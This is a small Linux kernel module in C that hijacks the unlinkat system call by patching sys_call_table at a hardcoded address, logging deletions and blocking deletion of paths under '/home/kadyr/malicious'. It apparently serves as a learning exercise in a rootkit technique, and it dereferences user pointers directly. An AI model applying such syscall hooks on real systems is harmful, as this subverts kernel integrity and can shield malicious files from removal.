#include <linux/uaccess.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <asm/unistd.h>
#include <asm/page.h>
#include <asm/highmem.h>
#include <linux/mm.h>
#include <asm/tlbflush.h>
#include <linux/kallsyms.h>
#include <linux/rwsem.h>

#define SYS_CALL_TABLE 0xc15fc0e0
static void **sys_call_table = NULL;




asmlinkage long (*orig_unlinkat)(int dfd, const char __user *filename, int flags);


asmlinkage long hacked_unlinkat(int dfd, const char __user *filename, int flags){
    
	char* must_be = "/home/kadyr/malicious";
	pr_info("function: %s\n",__func__);
	printk (KERN_ALERT "About to delete: %s\n", filename);
	
	if (filename != NULL && strncmp(filename, must_be, strlen(must_be)) == 0) {
		return -EINVAL;
	}

	return orig_unlinkat(dfd,filename,flags);
}



static int __init hook_init( void  ) {

    pr_info("function: %s\n",__func__);

    sys_call_table = (void **) 0xc15fc0e0;
    pr_info("sys_call_table: %p\n",sys_call_table);
    orig_unlinkat = sys_call_table[__NR_unlinkat];
    sys_call_table[__NR_unlinkat] = hacked_unlinkat;
    	
    pr_info("Original sys_table_unlink: %p\n", orig_unlinkat);
    pr_info("Hacked sys_table_unlink: %p\n", hacked_unlinkat);
    return 0;
}


void __exit hook_exit( void  ) {
    pr_info("function: %s\n",__func__);
    sys_call_table[__NR_unlinkat] = orig_unlinkat;	
    return;
}

module_init(hook_init);
module_exit(hook_exit);
MODULE_DESCRIPTION("module template");
MODULE_LICENSE("GPL");

